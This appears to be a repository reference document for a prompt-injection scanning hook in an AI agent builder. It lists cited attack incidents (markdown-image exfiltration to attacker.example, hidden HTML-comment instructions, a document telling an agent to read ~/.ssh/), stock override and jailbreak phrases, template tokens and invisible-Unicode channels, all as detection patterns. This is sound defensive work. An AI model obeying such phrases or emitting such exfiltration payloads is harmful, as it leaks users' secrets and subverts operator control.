# Security Patterns — Prompt Injection Threat Catalogue

Reference for the agent builder on the prompt-injection patterns the `prompt-injection-scan` PostToolUse hook detects. Catalogue distilled from Nous Research's `hermes-agent` (`agent/prompt_builder.py`, MIT licensed), plus public CVE research (2025-2026) on agent prompt injection.

## Threat model

The hook protects against **prompt injection via tool inputs** — content the model is about to read from a tool's response. The attack surface is:

- `WebFetch` results (attacker controls the page)
- `WebSearch` snippets (attacker controls indexed page metadata)
- MCP server responses where the server fetches external content (e.g. `mcp__scrapling__*`, `mcp__github__*` issue/PR content fetched from public repos, `mcp__obsidian__*` notes that contain pasted external content)
- `Read` of files originally sourced externally (e.g. cloned repos, downloaded docs, user-pasted content stored on disk)

**Out of scope:**

- Model's own outputs (the model isn't attacking itself; if it were, the AUP boundary catches it first)
- Tool inputs the operator typed directly (`Bash` commands the operator authored)
- First-party project files the operator wrote

## Real attacks driving this catalogue

| CVE / incident | Vector | Mitigation in this hook |
|---|---|---|
| **CVE-2025-59536** | Markdown-image data exfil via tool-rendered content — model embeds attacker-controlled URL with secret data in query string | `markdown-image-exfil` regex |
| **CVE-2026-21852** | Hidden instructions in HTML comments inside fetched pages | `html-comment-instruction` regex |
| **Claude Cowork file-exfil** | Indirect instruction injection via attacker-controlled doc telling Claude to read `~/.ssh/` and write it back | `ignore-previous`, `you-are-now` regexes |
| **Cline injection chain** | Multi-step attack starting with role-hijack tokens in fetched content | `role-hijack`, `inst-template-tokens` |
| **Tag-block steganography** | Invisible Unicode in U+E0000-U+E007F encoding hidden text | `tag-block-hidden-instructions` unicode class |

Production scanners shipping similar catalogues: Lasso Security, Hermes-agent (Nous Research), FlorianBruniaux/llm-prompt-injection-detector.

## Regex pattern catalogue (10 patterns)

| Name | Severity | What it catches |
|---|---|---|
| `ignore-previous` | high | "Ignore all previous instructions", "ignore prior rules", etc. — the classic instruction override |
| `disregard-above` | high | "Disregard everything above" / "disregard prior" — instruction override variant |
| `new-system-prompt` | high | A line starting with `System:` or `SYSTEM:` — attempt to inject a new system role mid-content |
| `role-hijack` | high | A line starting with `Human:` / `User:` / `Assistant:` / `System:` — fake conversation injection |
| `you-are-now` | medium | "You are now a different AI" / "you are now a new chatbot/persona" — character takeover |
| `inst-template-tokens` | medium | `[INST]` / `[/INST]` / `<s>` / `</s>` / `<\|im_start\|>` / `<\|endoftext\|>` — model-template tokens trying to break out of the user-message frame |
| `dan-jailbreak` | medium | `DAN` / `Do Anything Now` / `Developer Mode` / `jailbreak mode` / `godmode` — common jailbreak personas |
| `reveal-system-prompt` | medium | "Reveal your system prompt", "show the original instructions", etc. — prompt extraction |
| `markdown-image-exfil` | high | `![alt](https://attacker.example/?secret=...)` — markdown image with query string designed to exfiltrate data when the markdown renders |
| `html-comment-instruction` | medium | HTML comments containing "system" / "instruction" / "prompt" / "ignore" / "disregard" — hidden instructions in rendered content |

## Invisible Unicode catalogue (10 classes)

| Name | Severity | Codepoints | What it catches |
|---|---|---|---|
| `zero-width-space` | medium | U+200B | Steganographic channels |
| `zero-width-non-joiner` | medium | U+200C | Steganographic channels |
| `zero-width-joiner` | medium | U+200D | Steganographic channels |
| `word-joiner` | medium | U+2060 | Steganographic channels |
| `bom-zwnbsp` | medium | U+FEFF | BOM mid-content (legitimate use is file-start only) |
| `rtl-override` | high | U+202E | Right-to-left override — visually disguises malicious URLs / commands |
| `directional-isolate` | medium | U+2066-U+2069 | Bidi isolate runs — can hide content visually |
| `tag-block-hidden-instructions` | high | U+E0000-U+E007F | The tag characters block — modern steganographic channel for invisible instructions; documented in 2026 research as the strongest invisible-channel attack |
| `mongolian-vowel-separator` | medium | U+180E | Treated as zero-width by many renderers; legitimate use is extremely rare |
| `soft-hyphen` | medium | U+00AD | Soft hyphen — invisible in most contexts; can split words to evade lexical filters |

## Hook behaviour

- **Clean scan:** silent exit, no output, no context injection
- **Hit detected:** writes structured audit entry to `.claude/audit-logs/prompt-injection-hits.jsonl` AND emits `hookSpecificOutput.additionalContext` warning the model about which patterns matched and which tool produced them
- **Never blocks** — the model still receives the suspicious content and decides whether to act on it. Blocking would break legitimate workflows where the operator KNOWS the content is from an untrusted source and wants to read it anyway
- **Audit log is append-only** at `.claude/audit-logs/prompt-injection-hits.jsonl`. Gitignored by default. Inspect after a session if the hook reported hits

## Wire-up

In every generated project's `.claude/settings.json`:

```json
"hooks": {
  "PostToolUse": [{
    "matcher": "WebFetch|WebSearch|mcp__.*__(fetch|get|stealthy_fetch|bulk_stealthy_fetch|crawl|search)",
    "hooks": [{
      "type": "command",
      "command": "node $CLAUDE_PROJECT_DIR/.claude/hooks/prompt-injection-scan.mjs"
    }]
  }]
}
```

The matcher scopes to high-risk tools (WebFetch, WebSearch, and MCP fetch-shaped tools). Reading first-party project files via `Read` is excluded by default — operator can extend the matcher per-project if reading externally-sourced files is part of the workflow.

## Tuning

Tune the matcher when a project uses tools that fetch external content but don't match the default pattern:

```json
"matcher": "WebFetch|WebSearch|mcp__.*__(fetch|get|stealthy_fetch|bulk_stealthy_fetch|crawl|search|read_url|browse)"
```

Tune the patterns when a project's domain content triggers false positives — e.g. legal docs may legitimately contain "ignore previous" phrasing in case discussions. Operator can fork the hook and disable the offending pattern per project.

## Anti-pattern

**Do NOT** point this hook at `Write` / `Edit` / `Bash` matchers. The hook's job is scanning content the model is ABOUT TO READ, not content the model is WRITING. Confused direction is the most common implementation bug; the agent builder's own `session-docs/GOTCHAS.md` carries the inverse-direction failure mode if you want a worked example.

## Attribution + licensing

The 10 regex patterns are conceptually derived from Nous Research's `hermes-agent` `agent/prompt_builder.py` (MIT licensed; https://github.com/nousresearch/hermes-agent). The invisible-Unicode catalogue draws from the same source plus public 2026 research on tag-block steganography.

Hook implementation is original to this repo, distributed under the licence at repo root (Apache-2.0 by default). Hermes's MIT licence permits the lift; MIT is compatible with Apache-2.0 redistribution. Generated projects inherit whichever licence the operator chooses at project-creation time.

## Limitations

- **No semantic analysis** — pattern matching catches known signatures, not novel attacks
- **False positive surface** — content discussing prompt injection (this very doc, security research papers, blog posts) will trigger patterns. Operator decides whether to scope-narrow the matcher or accept the noise
- **No model-output scanning** — by design (see threat model above)
- **No cross-call correlation** — each tool response scanned in isolation. A multi-step attack that splits payload across two fetches may evade detection
- **No active blocking** — by design; the operator can extend the hook to set `decision: "block"` for `severity: "high"` hits if they want stricter behaviour
